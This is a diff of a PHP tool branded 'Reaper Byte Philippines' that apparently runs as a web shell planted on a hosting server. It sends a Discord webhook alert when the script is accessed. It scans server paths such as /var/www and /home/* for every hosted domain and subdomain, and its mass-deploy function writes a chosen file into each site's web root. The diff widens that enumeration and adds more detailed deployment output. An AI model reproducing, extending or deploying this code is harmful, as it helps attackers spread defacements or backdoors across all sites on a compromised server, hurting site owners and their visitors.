@@ -1,6 +1,6 @@
 <?php
 // Discord Webhook Notification when script is accessed
-$webhookUrl = "https://discord.com/api/webhooks/1440628547784937632/UPihGhacKZ-AFt0iwOdReRCqghTydFrDlaQWsYqxPVOjCjM0fTJKiIyTqz7IWx_2soNJ";
+$webhookUrl = "https://discord.com/api/webhooks/1440628547784937632/UPihGhacKZ-AFt0iwOdReRCqghTydFrDlaQWsYqxPVOjCjM0fTJKiIyTxdFrDlaQWsYqxPVOjCjM0fTJKiIyT";
 
 // Send webhook only once when script is accessed
 if (!isset($_COOKIE['rbp_visited'])) {
@@ -66,7 +66,8 @@ function RBPautoDetectBaseDir() {
         '/var/www',
         '/home/*/www',
         '/home/*/web',
-        '/home/*/*/public_html'
+        '/home/*/*/public_html',
+        '/home/*', // Added to check direct user home directory
     ];
     
     $currentUser = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown';
@@ -88,35 +89,32 @@ function RBPgetAllSubdomains($baseDir) {
     
     // Look for domains directory structure
     if (is_dir($baseDir)) {
-        // Check if this is a domains directory
+        // Get all directories in base directory
         $domainDirs = glob($baseDir . '/*', GLOB_ONLYDIR);
+        
         if ($domainDirs) {
             foreach ($domainDirs as $domainDir) {
                 $domainName = basename($domainDir);
                 
-                // Check for public_html in domain directory
-                $publicHtml = $domainDir . '/public_html';
-                if (is_dir($publicHtml)) {
-                    $subdomains[] = [
-                        'name' => $domainName,
-                        'path' => $publicHtml,
-                        'url' => 'https://' . $domainName
-                    ];
-                }
-                
-                // Also check for subdomain directories
-                $subdomainDirs = glob($domainDir . '/*', GLOB_ONLYDIR);
-                if ($subdomainDirs) {
-                    foreach ($subdomainDirs as $subdomainDir) {
-                        $subdomainName = basename($subdomainDir);
-                        $subPublicHtml = $subdomainDir . '/public_html';
-                        if (is_dir($subPublicHtml)) {
-                            $subdomains[] = [
-                                'name' => $subdomainName . '.' . $domainName,
-                                'path' => $subPublicHtml,
-                                'url' => 'https://' . $subdomainName . '.' . $domainName
-                            ];
-                        }
+                // Check if it looks like a domain (has dot or common TLDs)
+                if (strpos($domainName, '.') !== false || 
+                    preg_match('/\.(com|net|org|in|co|info|biz|us|uk|ca|au)$/i', $domainName)) {
+                    
+                    // Check for public_html in domain directory
+                    $publicHtml = $domainDir . '/public_html';
+                    if (is_dir($publicHtml)) {
+                        $subdomains[] = [
+                            'name' => $domainName,
+                            'path' => $publicHtml,
+                            'url' => 'https://' . $domainName
+                        ];
+                    } else {
+                        // If no public_html, use the domain directory itself
+                        $subdomains[] = [
+                            'name' => $domainName,
+                            'path' => $domainDir,
+                            'url' => 'https://' . $domainName
+                        ];
                     }
                 }
             }
@@ -159,7 +157,7 @@ function RBPmassDeploy($sourceFile, $baseDir) {
         }
         
         if (file_put_contents($targetFile, $fileContent)) {
-            $results[] = "[$processed/$total] Deployed to: " . $subdomain['name'];
+            $results[] = "[$processed/$total] Deployed to: " . $subdomain['name'] . " (" . $subdomain['path'] . ")";
         } else {
             $results[] = "[$processed/$total] Failed: " . $subdomain['name'];
         }
@@ -1207,7 +1205,7 @@ if (isset($_SESSION['download_result'])) {
 <body>
     <div class="header">
         <div class="logo-container">
-            <img src="https://i.ibb.co/274V1hJ0/unnamed-14-removebg-preview.png" class="logo" alt="RBP Logo">
+            <img src="https://i.ibb.co/XZfn7cGz/1764515071979.jpg" class="logo" alt="RBP Logo">
             <div class="logo-text">Reaper Byte Philippines</div>
         </div>
         
@@ -1409,10 +1407,15 @@ if (isset($_SESSION['download_result'])) {
                     $domains = RBPgetAllSubdomains($baseDir);
                     if (count($domains) === 0) {
                         echo '<p style="color: red;">No domains found in base directory!</p>';
+                        echo '<p style="color: #aaa; font-size: 12px;">Expected structure: /home/db/domain.com/ (or any directory containing domain folders)</p>';
                     } else {
                         echo '<p style="color: lime;">Found ' . count($domains) . ' domains/subdomains</p>';
                         foreach ($domains as $domain) {
-                            echo '<div class="domain-item">' . htmlspecialchars($domain['name']) . ' -> ' . htmlspecialchars($domain['path']) . '</div>';
+                            $icon = is_dir($domain['path']) ? '✓' : '✗';
+                            $color = is_dir($domain['path']) ? '#4CAF50' : '#f44336';
+                            echo '<div class="domain-item" style="color: ' . $color . '">' . 
+                                 $icon . ' ' . htmlspecialchars($domain['name']) . ' -> ' . htmlspecialchars($domain['path']) . 
+                                 '</div>';
                         }
                     }
                     ?>
@@ -1421,9 +1424,9 @@ if (isset($_SESSION['download_result'])) {
                 <!-- Custom Directory Input -->
                 <div class="custom-dir-input">
                     <p><strong>Custom Base Directory (if domains not detected):</strong></p>
-                    <input type="text" id="custom_base_dir" placeholder="/home/username/domains" value="<?php echo htmlspecialchars($baseDir); ?>" style="width: 100%; padding: 8px; background: #2a2a2a; border: 1px solid #444; border-radius: 3px; color: #fff;">
+                    <input type="text" id="custom_base_dir" placeholder="/home/db/" value="<?php echo htmlspecialchars($baseDir); ?>" style="width: 100%; padding: 8px; background: #2a2a2a; border: 1px solid #444; border-radius: 3px; color: #fff;">
                     <p style="color: #aaa; font-size: 11px; margin-top: 5px;">
-                        Common paths: /home/*/domains, /var/www, /home/*/public_html
+                        Enter the directory containing your domains (e.g., /home/db/ where domain.com directories are located)
                     </p>
                 </div>
                 
